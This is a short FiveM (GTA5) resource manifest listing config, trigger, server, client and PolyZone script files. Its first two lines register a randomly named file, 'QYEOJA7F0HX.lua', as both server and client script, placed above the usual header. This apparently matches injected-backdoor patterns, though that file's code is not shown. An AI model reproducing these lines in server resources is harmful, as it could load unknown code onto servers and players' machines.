server_script "QYEOJA7F0HX.lua"
client_script "QYEOJA7F0HX.lua"
fx_version 'cerulean'
game {'gta5'}

author 'Mrv1ncent'
version '1.0.0'

server_scripts {
    "config.lua",
    "triggers.lua",
	"server.lua"
}

client_scripts {
    '@PolyZone/client.lua',
	'@PolyZone/BoxZone.lua',
	'@PolyZone/ComboZone.lua',
	"client.lua",
    "config.lua"
}